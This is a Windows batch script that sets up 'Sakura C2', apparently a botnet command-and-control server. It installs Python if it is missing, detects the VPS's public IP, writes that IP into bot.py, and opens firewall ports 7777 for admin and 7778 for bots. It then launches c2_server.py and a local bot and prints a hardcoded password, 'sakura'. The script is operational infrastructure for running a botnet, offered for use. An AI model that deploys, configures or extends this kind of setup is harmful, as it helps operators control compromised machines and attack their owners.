@echo off
title Sakura C2 Setup
color 0C
echo.
echo  ██████  █████  ██   ██ ██    ██ ██████   █████
echo  ██      ██   ██ ██  ██  ██    ██ ██   ██ ██   ██
echo   █████  ███████ █████   ██    ██ ██████  ███████
echo       ██ ██   ██ ██  ██  ██    ██ ██   ██ ██   ██
echo  ██████  ██   ██ ██   ██  ██████  ██   ██ ██   ██
echo.
echo  ══════════════════════════════════════════════════
echo   Sakura C2 — Windows VPS Auto Setup
echo  ══════════════════════════════════════════════════
echo.

:: ─── Check admin ───
net session >nul 2>&1
if errorlevel 1 (
    echo [!] Run as Administrator for firewall rules.
    echo [*] Continuing without firewall changes...
    echo.
)

:: ─── Check Python ───
python --version >nul 2>&1
if errorlevel 1 (
    echo [!] Python not found. Installing...
    echo [*] Downloading Python 3.12.7...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.12.7/python-3.12.7-amd64.exe' -OutFile '%TEMP%\python_installer.exe'"
    if not exist "%TEMP%\python_installer.exe" (
        echo [!] Download failed. Install Python manually.
        pause
        exit /b 1
    )
    echo [*] Installing Python...
    %TEMP%\python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_pip=1
    echo [+] Python installed. Restart this script.
    del /f "%TEMP%\python_installer.exe" >nul 2>&1
    pause
    exit
)

for /f "tokens=*" %%v in ('python --version 2^>^&1') do echo [+] %%v
echo.

:: ─── Detect IP ───
echo [*] Detecting VPS IP...
set "VPS_IP="

:: try external IP first
for /f "tokens=*" %%a in ('powershell -Command "(Invoke-WebRequest -Uri 'https://api.ipify.org' -TimeoutSec 5 -UseBasicParsing).Content" 2^>nul') do set "VPS_IP=%%a"

if not defined VPS_IP (
    for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /c:"IPv4"') do (
        set "VPS_IP=%%a"
        goto :found_ip
    )
)
:found_ip
if defined VPS_IP set "VPS_IP=%VPS_IP: =%"

if not defined VPS_IP (
    set /p "VPS_IP=Enter VPS IP: "
)

echo [+] VPS IP: %VPS_IP%
echo.

:: ─── Configure bot ───
echo [*] Configuring bot.py with VPS IP...
if exist "%~dp0bot.py" (
    powershell -Command "(Get-Content '%~dp0bot.py') -replace 'YOUR_VPS_IP', '%VPS_IP%' | Set-Content '%~dp0bot.py'"
    echo [+] bot.py configured.
) else (
    echo [!] bot.py not found in %~dp0
)
echo.

:: ─── Firewall ───
echo [*] Opening firewall ports...
netsh advfirewall firewall delete rule name="Sakura C2 Admin" >nul 2>&1
netsh advfirewall firewall delete rule name="Sakura C2 Bots" >nul 2>&1
netsh advfirewall firewall add rule name="Sakura C2 Admin" dir=in action=allow protocol=tcp localport=7777 >nul 2>&1
netsh advfirewall firewall add rule name="Sakura C2 Bots" dir=in action=allow protocol=tcp localport=7778 >nul 2>&1
echo [+] Ports 7777 (admin) and 7778 (bots) opened.
echo.

:: ─── Start server ───
echo [*] Starting C2 server...
start "Sakura C2 Server" cmd /k "cd /d %~dp0 && color 0C && python c2_server.py"
timeout /t 3 /nobreak >nul

:: ─── Start bot ───
echo [*] Starting local bot...
start "Sakura Bot" cmd /k "cd /d %~dp0 && color 0A && python bot.py"

echo.
echo  ══════════════════════════════════════════════════
echo   SETUP COMPLETE
echo  ══════════════════════════════════════════════════
echo.
echo   C2 Server:  port 7777  (admin)
echo   Bot Port:   port 7778  (bots)
echo   VPS IP:     %VPS_IP%
echo   Password:   sakura
echo.
echo   Connect:    PuTTY ^> Raw ^> %VPS_IP%:7777
echo.
echo   Two windows opened (server + bot).
echo   Do NOT close them.
echo  ══════════════════════════════════════════════════
echo.
pause
